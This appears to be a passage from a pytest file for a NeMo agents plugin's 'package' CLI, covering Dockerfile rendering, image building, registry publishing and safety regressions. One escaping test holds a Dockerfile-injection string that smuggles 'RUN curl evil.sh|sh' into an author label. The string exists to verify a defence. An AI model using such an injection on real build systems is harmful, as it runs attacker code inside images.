        self, package_cli, fabric_agent_config: Path, tmp_path: Path
    ) -> None:
        """Fabric render-only mode honors shared CLI flags without NAT arguments."""
        app, runner = package_cli
        output = tmp_path / "Dockerfile.fabric"

        result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(fabric_agent_config),
                "--output",
                str(output),
                "--base-image-url",
                "custom/image",
                "--base-image-tag",
                "custom-tag",
                "--python-version",
                "3.12",
                "--uv-version",
                "0.9.0",
                "--allow-root",
                "--no-build",
            ],
        )

        assert result.exit_code == 0, result.stdout
        rendered = output.read_text()
        assert "ARG BASE_IMAGE_URL=custom/image" in rendered
        assert "ARG BASE_IMAGE_TAG=custom-tag" in rendered
        assert "ARG PYTHON_VERSION=3.12" in rendered
        assert "ghcr.io/astral-sh/uv:0.9.0" in rendered
        assert "USER agent" not in rendered
        assert "NAT_VERSION" not in rendered

    def test_fabric_no_build_project_mode_uses_project_root(self, package_cli, tmp_path: Path) -> None:
        app, runner = package_cli
        configs = tmp_path / "configs"
        configs.mkdir()
        agent_config = configs / "agent.yaml"
        agent_config.write_text("config_format: nemo-agents-spec-v1\nname: fabric-agent\n")
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "fabric-agent"\nversion = "1.0.0"\n')

        result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(agent_config),
                "--pyproject",
                str(pyproject),
                "--no-build",
            ],
        )

        assert result.exit_code == 0, result.stdout
        output = tmp_path / "Dockerfile"
        assert output.exists()
        rendered = output.read_text()
        assert "ENV AGENT_CONFIG_PATH=/workspace/configs/agent.yaml" in rendered
        from nemo_agents_plugin.container.template import PINNED_NEMO_RELAY_CLI_VERSION

        assert f'"nemo-relay=={PINNED_NEMO_RELAY_CLI_VERSION}" .' in rendered
        assert not (configs / "Dockerfile").exists()

    def test_no_build_project_mode_writes_dockerfile_next_to_pyproject(
        self, package_cli, project_dir: "tuple[Path, Path]"
    ) -> None:
        """In --pyproject mode the default output lives at the project root.

        Regression: the Dockerfile's ``COPY pyproject.toml .`` / ``COPY . .``
        only resolve when the Dockerfile sits beside pyproject.toml.  With a
        nested agent config (``configs/config.yaml``) the old default put the
        Dockerfile in ``configs/``, breaking the build context.
        """
        app, runner = package_cli
        config, pyproject = project_dir

        result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(config),
                "--pyproject",
                str(pyproject),
                "--nat-version",
                "1.4.0",
                "--no-build",
            ],
        )

        assert result.exit_code == 0, result.stdout
        # Default output must be the project root (pyproject's directory),
        # NOT the config's parent directory.
        assert (pyproject.parent / "Dockerfile").exists()
        assert not (config.parent / "Dockerfile").exists()
        assert (pyproject.parent / ".dockerignore").exists()

    def test_no_build_config_only_mode_writes_dockerfile_next_to_config(self, package_cli, agent_config: Path) -> None:
        """Without --pyproject the default output stays beside the agent config."""
        app, runner = package_cli

        result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(agent_config),
                "--nat-version",
                "1.4.0",
                "--no-build",
            ],
        )

        assert result.exit_code == 0, result.stdout
        assert (agent_config.parent / "Dockerfile").exists()

    def test_warns_when_nat_version_unpinned_and_silent_when_pinned(
        self, package_cli, agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Package CLI warns on unpinned --nat-version, stays silent when pinned.

        Reproducibility hinges on callers pinning the NAT release explicitly.
        One test exercises both branches (unpinned → warn, pinned → silent)
        and verifies the warned version matches the baked-in default so
        reviewers updating the default can't accidentally drift the message.
        """
        from nemo_agents_plugin.container.template import _DEFAULTS

        app, runner = package_cli
        monkeypatch.delenv("NAT_VERSION", raising=False)

        # Branch 1: no --nat-version flag, no env var → warning with the default version.
        unpinned = runner.invoke(
            app,
            ["package", "--agent", str(agent_config), "--no-build"],
        )
        assert unpinned.exit_code == 0, unpinned.stdout
        warn_stream = unpinned.stderr or unpinned.stdout
        assert "warning:" in warn_stream
        assert "--nat-version not provided" in warn_stream
        assert _DEFAULTS["nat_version"] in warn_stream

        # Branch 2: explicit --nat-version → no warning on the version at all.
        pinned = runner.invoke(
            app,
            ["package", "--agent", str(agent_config), "--nat-version", "1.4.0", "--no-build"],
        )
        assert pinned.exit_code == 0, pinned.stdout
        combined = (pinned.stderr or "") + pinned.stdout
        assert "--nat-version not provided" not in combined

    def test_default_runs_build_without_publish(self, package_cli, agent_config: Path) -> None:
        """Default invocation builds the image and does not publish."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            mock_build.return_value = "my-agent:1.0"
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--nat-version",
                    "1.5.0",
                    "--tag",
                    "my-agent:1.0",
                ],
            )

        assert result.exit_code == 0, result.stdout
        assert "Image ready: my-agent:1.0" in result.stdout
        mock_build.assert_called_once()
        assert mock_build.call_args.kwargs["tag"] == "my-agent:1.0"
        mock_push.assert_not_called()

    def test_shared_package_env_vars_are_forwarded(
        self,
        package_cli,
        agent_config: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Canonical shared environment variables reach the selected builder."""
        app, runner = package_cli
        monkeypatch.setenv("NEMO_AGENTS_BASE_IMAGE_URL", "env/image")
        monkeypatch.setenv("NEMO_AGENTS_BASE_IMAGE_TAG", "env-tag")
        monkeypatch.setenv("NEMO_AGENTS_PYTHON_VERSION", "3.12")
        monkeypatch.setenv("NEMO_AGENTS_UV_VERSION", "0.9.0")

        with patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_build:
            mock_build.return_value = "my-agent:dev"
            result = runner.invoke(
                app,
                ["package", "--agent", str(agent_config), "--nat-version", "1.8.0"],
            )

        assert result.exit_code == 0, result.stdout
        kwargs = mock_build.call_args.kwargs
        assert kwargs["base_image_url"] == "env/image"
        assert kwargs["base_image_tag"] == "env-tag"
        assert kwargs["python_version"] == "3.12"
        assert kwargs["uv_version"] == "0.9.0"

    def test_shared_package_flags_override_environment(
        self,
        package_cli,
        agent_config: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Explicit shared package flags take precedence over environment values."""
        app, runner = package_cli
        monkeypatch.setenv("NEMO_AGENTS_BASE_IMAGE_URL", "env/image")
        monkeypatch.setenv("NEMO_AGENTS_BASE_IMAGE_TAG", "env-tag")
        monkeypatch.setenv("NEMO_AGENTS_PYTHON_VERSION", "3.11")
        monkeypatch.setenv("NEMO_AGENTS_UV_VERSION", "0.8.0")

        with patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_build:
            mock_build.return_value = "my-agent:dev"
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--nat-version",
                    "1.8.0",
                    "--base-image-url",
                    "flag/image",
                    "--base-image-tag",
                    "flag-tag",
                    "--python-version",
                    "3.13",
                    "--uv-version",
                    "0.10.0",
                ],
            )

        assert result.exit_code == 0, result.stdout
        kwargs = mock_build.call_args.kwargs
        assert kwargs["base_image_url"] == "flag/image"
        assert kwargs["base_image_tag"] == "flag-tag"
        assert kwargs["python_version"] == "3.13"
        assert kwargs["uv_version"] == "0.10.0"

    def test_fabric_config_routes_only_to_fabric_builder(self, package_cli, fabric_agent_config: Path) -> None:
        """Fabric configs select the Fabric builder without NAT-only arguments."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_fabric_agent_image") as mock_fabric_build,
            patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_nat_build,
        ):
            mock_fabric_build.return_value = "fabric-agent:dev"
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(fabric_agent_config),
                    "--tag",
                    "fabric-agent:dev",
                ],
            )

        assert result.exit_code == 0, result.stdout
        assert "Image ready: fabric-agent:dev" in result.stdout
        mock_fabric_build.assert_called_once()
        mock_nat_build.assert_not_called()
        assert mock_fabric_build.call_args.args == (fabric_agent_config,)
        assert mock_fabric_build.call_args.kwargs["tag"] == "fabric-agent:dev"
        assert "nat_version" not in mock_fabric_build.call_args.kwargs

    def test_fabric_validation_error_is_reported_cleanly(self, package_cli, fabric_agent_config: Path) -> None:
        """Fabric package validation failures are presented as CLI errors."""
        from nemo_agents_plugin.container.fabric_validator import FabricPackageValidationError

        app, runner = package_cli

        with patch("nemo_agents_plugin.container.builder.build_fabric_agent_image") as mock_fabric_build:
            mock_fabric_build.side_effect = FabricPackageValidationError(
                "Fabric package validation failed: invalid harness settings"
            )
            result = runner.invoke(app, ["package", "--agent", str(fabric_agent_config)])

        assert result.exit_code == 1
        assert "Error: Fabric package validation failed: invalid harness settings" in (result.stderr or result.stdout)
        assert result.exception is not None

    def test_fabric_skip_validation_is_forwarded(self, package_cli, fabric_agent_config: Path) -> None:
        """The shared skip flag reaches the Fabric builder."""
        app, runner = package_cli

        with patch("nemo_agents_plugin.container.builder.build_fabric_agent_image") as mock_fabric_build:
            mock_fabric_build.return_value = "fabric-agent:dev"
            result = runner.invoke(
                app,
                ["package", "--agent", str(fabric_agent_config), "--skip-validation"],
            )

        assert result.exit_code == 0, result.stdout
        assert mock_fabric_build.call_args.kwargs["skip_validation"] is True

    def test_fabric_config_ignores_ambient_nat_version(
        self, package_cli, fabric_agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A shell-level NAT_VERSION must not affect Fabric packaging."""
        app, runner = package_cli
        monkeypatch.setenv("NAT_VERSION", "1.8.0")

        with (
            patch("nemo_agents_plugin.container.builder.build_fabric_agent_image") as mock_fabric_build,
            patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_nat_build,
        ):
            mock_fabric_build.return_value = "fabric-agent:dev"
            result = runner.invoke(app, ["package", "--agent", str(fabric_agent_config)])

        assert result.exit_code == 0, result.stdout
        mock_fabric_build.assert_called_once()
        mock_nat_build.assert_not_called()
        assert "nat_version" not in mock_fabric_build.call_args.kwargs

    def test_fabric_config_rejects_explicit_nat_version(self, package_cli, fabric_agent_config: Path) -> None:
        """An explicit --nat-version remains an error for Fabric packaging."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_fabric_agent_image") as mock_fabric_build,
            patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_nat_build,
        ):
            result = runner.invoke(
                app,
                ["package", "--agent", str(fabric_agent_config), "--nat-version", "1.8.0"],
            )

        assert result.exit_code == 1
        assert "--nat-version is only valid for NAT workflow packaging" in (result.stderr or result.stdout)
        mock_fabric_build.assert_not_called()
        mock_nat_build.assert_not_called()

    def test_nat_config_resolves_nat_version_from_environment(
        self,
        package_cli,
        agent_config: Path,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """NAT packaging still resolves NAT_VERSION after CLI routing."""
        app, runner = package_cli
        output = tmp_path / "Dockerfile"
        monkeypatch.setenv("NAT_VERSION", "1.8.0")

        result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(agent_config),
                "--output",
                str(output),
                "--no-build",
            ],
        )

        assert result.exit_code == 0, result.stdout
        assert "ARG NAT_VERSION=1.8.0" in output.read_text()
        assert "--nat-version not provided" not in ((result.stderr or "") + result.stdout)

    def test_publish_pushes_after_build(self, package_cli, agent_config: Path) -> None:
        """``--publish --registry`` triggers a push after a successful build."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            mock_build.return_value = "my-agent:1.0"
            mock_push.return_value = "nvcr.io/my-org/my-agent:1.0"

            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--nat-version",
                    "1.5.0",
                    "--tag",
                    "my-agent:1.0",
                    "--publish",
                    "--registry",
                    "nvcr.io/my-org",
                ],
            )

        assert result.exit_code == 0, result.stdout
        assert "Image ready: my-agent:1.0" in result.stdout
        assert "Published: nvcr.io/my-org/my-agent:1.0" in result.stdout
        mock_build.assert_called_once()
        mock_push.assert_called_once_with(
            local_tag="my-agent:1.0", registry="nvcr.io/my-org", push_tag=None, on_progress=typer.echo
        )

    def test_publish_without_registry_fails(self, package_cli, agent_config: Path) -> None:
        """``--publish`` without ``--registry`` is rejected before any build runs."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            result = runner.invoke(
                app,
                ["package", "--agent", str(agent_config), "--publish"],
            )

        assert result.exit_code != 0
        assert "--registry" in (result.stderr or result.stdout)
        mock_build.assert_not_called()
        mock_push.assert_not_called()

    def test_no_build_and_publish_are_mutually_exclusive(self, package_cli, agent_config: Path) -> None:
        """``--no-build --publish`` is rejected at flag-validation time."""
        app, runner = package_cli

        with (
            patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_build,
            patch("nemo_agents_plugin.container.publisher.docker_push") as mock_push,
        ):
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--no-build",
                    "--publish",
                    "--registry",
                    "nvcr.io/x",
                ],
            )

        assert result.exit_code != 0
        assert "mutually exclusive" in (result.stderr or result.stdout)
        mock_build.assert_not_called()
        mock_push.assert_not_called()

    def test_invalid_format_fails(self, package_cli, agent_config: Path) -> None:
        """Unknown ``--format`` values are rejected."""
        app, runner = package_cli
        result = runner.invoke(
            app,
            ["package", "--agent", str(agent_config), "--format", "bogus", "--no-build"],
        )
        assert result.exit_code != 0
        assert "--format" in (result.stderr or result.stdout)

    def test_whl_format_rejected_in_every_mode(self, package_cli, agent_config: Path) -> None:
        """``--format whl`` is rejected before any build/render runs.

        Wheel packaging was scaffolded into the original CLI surface but
        never wired into either the build path or the render-only path.
        The guard lives in ``_validate_package_flags`` so we get the same
        "not yet implemented" error in both ``--no-build`` and the default
        build mode, instead of silently falling through to a docker build
        that ignores ``--format``.

        ``--agent-whl`` was removed alongside the validator branch that
        checked it; this test no longer needs to pass it.
        """
        app, runner = package_cli

        with patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_build:
            no_build_result = runner.invoke(
                app,
                ["package", "--agent", str(agent_config), "--format", "whl", "--no-build"],
            )
            build_result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--format",
                    "whl",
                    "--nat-version",
                    "1.5.0",
                ],
            )

        for result in (no_build_result, build_result):
            assert result.exit_code != 0
            assert "not yet implemented" in (result.stderr or result.stdout)
        mock_build.assert_not_called()


# ---------------------------------------------------------------------------
# Bug-fix regressions (see commit notes for the originating critical review)
# ---------------------------------------------------------------------------


class TestPackagingSafetyRegressions:
    """Lock in the safety fixes shipped after the initial critical review.

    Each test bundles several related assertions to minimize fixture
    overhead and to keep the regression contract for one bug visible in
    one place.
    """

    def test_label_values_are_escaped_against_dockerfile_injection(self, agent_config: Path) -> None:
        """Quotes, backslashes, and newlines in label values must not break out.

        Covers:
          * ``"`` in ``--agent-author`` (terminates the LABEL string early).
          * ``\\n`` in ``--agent-author`` (could inject a free-standing
            ``RUN`` instruction).
          * ``\\`` in ``--agent-author`` (escape character collision).
        """
        from nemo_agents_plugin.container.template import _dockerfile_escape, render_nat_dockerfile

        assert _dockerfile_escape('Alice "the Hacker"') == 'Alice \\"the Hacker\\"'
        assert _dockerfile_escape("multi\nline") == "multi line"
        assert _dockerfile_escape("back\\slash") == "back\\\\slash"

        rendered = render_nat_dockerfile(
            agent_config,
            nat_version="1.4.0",
            agent_version="1.0.0",
            agent_author='Eve";\nRUN curl evil.sh|sh\nLABEL hijacked="yes',
        )
        # The injection attempt is reduced to a single LABEL line with the
        # quote/backslash escaped and the newline collapsed to a space.
        assert "\nRUN curl evil.sh" not in rendered
        assert 'LABEL hijacked="yes"' not in rendered
        assert 'org.opencontainers.image.authors="Eve\\";' in rendered

    def test_dockerignore_preserves_user_files_and_overwrites_its_own(self, tmp_path: Path) -> None:
        """User-owned ``.dockerignore`` is preserved; plugin-owned is regenerated.

        The two cases must coexist: the first invocation in a project writes
        the plugin's file (with sentinel header), and re-running the
        packager must update that file in place without trampling a
        user-tuned one that exists alongside.
        """
        from nemo_agents_plugin.container.template import DOCKERIGNORE_SENTINEL, render_dockerignore

        # Case 1: no file → write ours.
        first = render_dockerignore(tmp_path)
        assert first is not None and first.exists()
        assert first.read_text().splitlines()[0] == DOCKERIGNORE_SENTINEL

        # Case 2: our previous file (sentinel present) → overwrite in place.
        first.write_text(DOCKERIGNORE_SENTINEL + "\nstale-contents\n")
        regenerated = render_dockerignore(tmp_path)
        assert regenerated == first
        assert "stale-contents" not in first.read_text()

        # Case 3: user-owned file (no sentinel) → leave it alone, return None.
        user_dir = tmp_path / "user_project"
        user_dir.mkdir()
        user_content = "# my carefully tuned ignores\ndata/\nlarge_assets/**\n"
        (user_dir / ".dockerignore").write_text(user_content)
        result = render_dockerignore(user_dir)
        assert result is None
        assert (user_dir / ".dockerignore").read_text() == user_content

    def test_no_build_refuses_to_clobber_existing_default_dockerfile(self, package_cli, agent_config: Path) -> None:
        """``--no-build`` must not silently overwrite the user's existing Dockerfile.

        Explicit ``--output`` is treated as informed consent and still
        overwrites; only the default-resolved path triggers the guard.
        """
        app, runner = package_cli

        existing = agent_config.parent / "Dockerfile"
        existing.write_text("FROM scratch\n# user's hand-tuned Dockerfile\n")

        # Default output → refuse, preserve.
        default_result = runner.invoke(
            app,
            ["package", "--agent", str(agent_config), "--nat-version", "1.4.0", "--no-build"],
        )
        assert default_result.exit_code != 0
        assert "refusing to overwrite" in (default_result.stderr or default_result.stdout)
        assert "user's hand-tuned" in existing.read_text()

        # Explicit --output to the same path → allowed.
        explicit_result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(agent_config),
                "--nat-version",
                "1.4.0",
                "--no-build",
                "--output",
                str(existing),
            ],
        )
        assert explicit_result.exit_code == 0, explicit_result.stdout
        assert "user's hand-tuned" not in existing.read_text()
        assert "FROM " in existing.read_text()

    def test_no_build_oserror_yields_clean_cli_error(self, package_cli, agent_config: Path, tmp_path: Path) -> None:
        """``OSError`` from the filesystem write surfaces as a clean CLI error.

        Regression: ``output.write_text`` and ``render_dockerignore`` ran
        outside any ``try`` block, so a read-only mount or a missing
        parent directory leaked a raw ``FileNotFoundError`` /
        ``PermissionError`` traceback to the operator.  Both writes are
        now wrapped in ``except OSError`` and exit via ``typer.Exit(1)``
        with an ``Error:`` line that names the failing file and the
        underlying message.
        """
        app, runner = package_cli

        # Parent directory deliberately doesn't exist → ``Path.write_text``
        # raises ``FileNotFoundError`` (an ``OSError`` subclass).
        bad_output = tmp_path / "nonexistent_subdir" / "Dockerfile"
        result = runner.invoke(
            app,
            [
                "package",
                "--agent",
                str(agent_config),
                "--nat-version",
                "1.4.0",
                "--no-build",
                "--output",
                str(bad_output),
            ],
        )
        assert result.exit_code != 0
        combined = (result.stderr or "") + (result.stdout or "")
        assert "Error: failed to write Dockerfile" in combined
        assert str(bad_output) in combined
        # The success message must not be printed when the write failed.
        assert "Dockerfile written to" not in combined
        # And no Python traceback should reach the operator.
        assert "Traceback" not in combined

    def test_multi_platform_rejected_with_actionable_error(self, package_cli, agent_config: Path) -> None:
        """Multiple ``--platform`` values are rejected — buildx wiring is not done.

        The previous CLI accepted multi-arch and printed a fake "pushed via
        buildx" success while actually building (and pushing) a single
        architecture.  We now fail fast with a pointer at the manual
        ``buildx imagetools`` workaround.
        """
        app, runner = package_cli

        with patch("nemo_agents_plugin.container.builder.build_nat_agent_image") as mock_build:
            result = runner.invoke(
                app,
                [
                    "package",
                    "--agent",
                    str(agent_config),
                    "--nat-version",
                    "1.4.0",
                    "--platform",
                    "linux/amd64",
                    "--platform",
                    "linux/arm64",
                    "--publish",
                    "--registry",
                    "nvcr.io/x",
                ],
            )

        assert result.exit_code != 0
        message = result.stderr or result.stdout
        assert "multi-arch" in message
        assert "buildx imagetools" in message
        mock_build.assert_not_called()

    def test_default_tag_sanitizes_uppercase_names_and_pep440_versions(self, tmp_path: Path) -> None:
        """Default tag is always a valid Docker reference.

        PEP 621 ``project.name`` permits uppercase, and PEP 440
        ``project.version`` permits ``+local`` and ``!epoch`` segments;
        Docker rejects all of these.  Sanitize so the build never trips
        ``invalid reference format``.
        """
        from nemo_agents_plugin.container.builder import _default_tag, _sanitize_image_name, _sanitize_image_tag

        assert _sanitize_image_name("HelloWorld") == "helloworld"
        assert _sanitize_image_name("My Project!") == "my-project"
        assert _sanitize_image_name("") == "agent"
        assert _sanitize_image_tag("1.0.0+local.20260529") == "1.0.0.local.20260529"
        assert _sanitize_image_tag("1!2.0") == "1.2.0"
        assert _sanitize_image_tag("") == "latest"

        (tmp_path / "configs").mkdir()
        config = tmp_path / "configs" / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "HelloWorld"\nversion = "1.0.0+local"\n')

        tag = _default_tag(config, pyproject, agent_author="x")
        name_part, version_part = tag.rsplit(":", 1)
        # Repo component must be lowercase; tag must not contain '+'.
        assert name_part == name_part.lower()
        assert "+" not in version_part

    def test_outside_pyproject_tree_fails_fast_instead_of_silently_breaking(
        self, agent_config: Path, tmp_path: Path
    ) -> None:
        """Agent config outside the pyproject build context must error at render time.

        Previously the renderer fell back to ``Path(agent_config.name)``,
        which produced an image that built successfully but crashed at
        ``nat serve`` startup with ``config file not found``.
        """
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir()
        pyproject = elsewhere / "pyproject.toml"
        pyproject.write_text('[project]\nname = "x"\nversion = "1.0.0"\n')

        with pytest.raises(ValueError, match="outside the pyproject build context"):
            render_nat_dockerfile(agent_config, pyproject, nat_version="1.4.0", agent_author="x")

    def test_agent_id_includes_build_environment(self, agent_config: Path) -> None:
        """Changing the toolchain must change the agent_id.

        Otherwise two ABI-incompatible images (built against different
        ``--nat-version`` / base images) share the same content-addressable
        suffix, making the id useless for caching or rollback.
        """
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta_v1 = extract_agent_metadata(
            agent_config,
            agent_author="x",
            build_env={"nat_version": "1.4.0", "python_version": "3.12"},
        )
        meta_v2 = extract_agent_metadata(
            agent_config,
            agent_author="x",
            build_env={"nat_version": "1.7.0", "python_version": "3.12"},
        )
        meta_legacy = extract_agent_metadata(agent_config, agent_author="x")

        assert meta_v1["agent_id"] != meta_v2["agent_id"]
        # Legacy callers that pass no build_env must still get a deterministic id.
        assert meta_legacy["agent_id"] == extract_agent_metadata(agent_config, agent_author="x")["agent_id"]

    def test_strip_credentials_drops_query_string_tokens(self) -> None:
        """Tokens hidden in the query string of an HTTPS git URL are scrubbed.

        Previously ``_strip_credentials`` only inspected ``userinfo`` in
        the netloc; a URL like ``https://github.com/x.git?token=TOKEN_X``
        leaked the token into ``org.opencontainers.image.source``.

        Fixtures use neutral placeholders (``TOKEN_X``) rather than real
        ``glpat-`` / ``ghp_`` prefixes so the test file does not trip
        secret-scanning hooks on push.
        """
        from nemo_agents_plugin.container.metadata import _strip_credentials

        assert _strip_credentials("https://github.com/x.git?token=TOKEN_X") == "https://github.com/x.git"
        assert _strip_credentials("https://gitlab.com/x.git?access_token=TOKEN_X#frag") == "https://gitlab.com/x.git"
        # SSH URLs keep their canonical shape unchanged.
        assert _strip_credentials("git@github.com:org/repo.git") == "git@github.com:org/repo.git"

    def test_source_date_epoch_pins_build_timestamp(self, agent_config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """``SOURCE_DATE_EPOCH`` makes ``image.created`` reproducible across runs."""
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        monkeypatch.setenv("SOURCE_DATE_EPOCH", "1700000000")
        meta = extract_agent_metadata(agent_config, agent_author="x")
        # 1700000000 = 2023-11-14T22:13:20 UTC.
        assert meta["build_timestamp"].startswith("2023-11-14T22:13:20")

    def test_builder_refuses_pre_existing_dockerfile_generated(self, tmp_path: Path, agent_config: Path) -> None:
        """``Dockerfile.generated`` collision triggers a refusal, not silent overwrite.

        The cleanup in ``finally`` would otherwise unlink the user's file
        once the build finishes.
        """
        from nemo_agents_plugin.container.builder import build_nat_agent_image

        user_file = agent_config.parent / "Dockerfile.generated"
        user_file.write_text("USER OWNED — DO NOT DELETE\n")

        with pytest.raises(ManagedFileConflictError):
            build_nat_agent_image(agent_config, nat_version="1.4.0", agent_author="x")

        assert user_file.exists()
        assert "USER OWNED" in user_file.read_text()


class TestFabricTagNamespace:
    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_explicit_tag_is_prefixed(self, mock_build: MagicMock, fabric_agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        mock_build.return_value = "placeholder"
        build_fabric_agent_image(
            fabric_agent_config, tag="my-agent:1.0", tag_namespace="nemo-agents/default", skip_validation=True
        )

        assert mock_build.call_args.kwargs["tag"] == "nemo-agents/default/my-agent:1.0"

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_derived_tag_is_prefixed(self, mock_build: MagicMock, fabric_agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        mock_build.return_value = "placeholder"
        build_fabric_agent_image(
            fabric_agent_config, tag_namespace="nemo-agents/default", skip_validation=True, agent_author="x"
        )

        assert mock_build.call_args.kwargs["tag"].startswith("nemo-agents/default/")

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_cli_path_is_unnamespaced(self, mock_build: MagicMock, fabric_agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_fabric_agent_image

        mock_build.return_value = "placeholder"
        build_fabric_agent_image(fabric_agent_config, tag="my-agent:1.0", skip_validation=True)

        assert mock_build.call_args.kwargs["tag"] == "my-agent:1.0"


class TestInstallableContractVersion:
    @pytest.mark.parametrize(
        "version",
        [
            "0.3.0.post402.dev0+062f0ac6e8",  # setuptools-scm from a source checkout
            "0.3.0+local",
            "1.2.3.dev0",
            "1.2.3dev0",
            "1.2.3-dev0",
            "1.2.3_dev0",
            # PEP 440 normalizes case, so these are dev releases too.
            "1.2.3.DEV0",
            "1.2.3DEV0",
            "1.2.3-DEV0",
            "1.2.3_DEV0",
        ],
    )
    def test_unpublishable_versions_are_rejected(self, version: str) -> None:
        from nemo_agents_plugin.container.template import require_installable_contract_version

        with pytest.raises(ValueError, match="Fabric packaging pins this exact version"):
            require_installable_contract_version(version)

    def test_a_checkout_version_reports_both_reasons(self) -> None:
        from nemo_agents_plugin.container.template import require_installable_contract_version

        with pytest.raises(ValueError) as excinfo:
            require_installable_contract_version("0.3.0.post402.dev0+062f0ac6e8")

        assert "carries a local build identifier and is a developmental release" in str(excinfo.value)

    @pytest.mark.parametrize("version", ["0.3.0", "0.4.0", "1.0.0.post1", "0.4.0rc1"])
    def test_published_versions_are_accepted(self, version: str) -> None:
        from nemo_agents_plugin.container.template import require_installable_contract_version

        require_installable_contract_version(version)

    def test_missing_install_keeps_its_own_message(self) -> None:
        from nemo_agents_plugin.container.template import (
            UNRESOLVED_CONTRACT_VERSION,
            require_installable_contract_version,
        )

        with pytest.raises(ValueError, match="Unable to resolve the installed nemo-platform contract version"):
            require_installable_contract_version(UNRESOLVED_CONTRACT_VERSION)

    @pytest.mark.parametrize("value", ["1", "true", "YES"])
    def test_env_override_allows_an_unpublished_version(self, value: str, monkeypatch: pytest.MonkeyPatch) -> None:
        from nemo_agents_plugin.container.template import require_installable_contract_version

        monkeypatch.setenv("NEMO_AGENTS_ALLOW_UNPUBLISHED_CONTRACT_VERSION", value)
        require_installable_contract_version("0.3.0.post402.dev0+062f0ac6e8")

    def test_env_override_ignores_unset_and_falsey(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from nemo_agents_plugin.container.template import require_installable_contract_version

        monkeypatch.setenv("NEMO_AGENTS_ALLOW_UNPUBLISHED_CONTRACT_VERSION", "0")
        with pytest.raises(ValueError):
            require_installable_contract_version("0.3.0+local")

    def test_override_cannot_bypass_an_unresolved_version(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from nemo_agents_plugin.container.template import (
            UNRESOLVED_CONTRACT_VERSION,
            require_installable_contract_version,
        )

        monkeypatch.setenv("NEMO_AGENTS_ALLOW_UNPUBLISHED_CONTRACT_VERSION", "1")

        with pytest.raises(ValueError, match="Unable to resolve the installed nemo-platform contract version"):
            require_installable_contract_version(UNRESOLVED_CONTRACT_VERSION)

    def test_custom_template_may_use_an_unpublished_version(self) -> None:
        from nemo_agents_plugin.container.template import require_installable_contract_version

        require_installable_contract_version("0.3.0.post402.dev0+062f0ac6e8", pins_contract_version=False)

    def test_custom_template_still_needs_an_installed_platform(self) -> None:
        from nemo_agents_plugin.container.template import (
            UNRESOLVED_CONTRACT_VERSION,
            require_installable_contract_version,
        )

        with pytest.raises(ValueError, match="Unable to resolve"):
            require_installable_contract_version(UNRESOLVED_CONTRACT_VERSION, pins_contract_version=False)

    def test_render_with_custom_template_allows_a_checkout_version(
        self, tmp_path: Path, fabric_agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import nemo_agents_plugin.container.template as template

        monkeypatch.setattr(template, "get_contract_version", lambda: "0.3.0.post402.dev0+062f0ac6e8")
        custom = tmp_path / "custom.j2"
        custom.write_text("FROM scratch\nLABEL agent={{ agent_name }}\n")

        result = template.render_fabric_dockerfile(fabric_agent_config, template_path=str(custom))

        assert "FROM scratch" in result

    def test_render_rejects_a_source_checkout_version(
        self, fabric_agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import nemo_agents_plugin.container.template as template

        monkeypatch.setattr(template, "get_contract_version", lambda: "0.3.0.post402.dev0+062f0ac6e8")

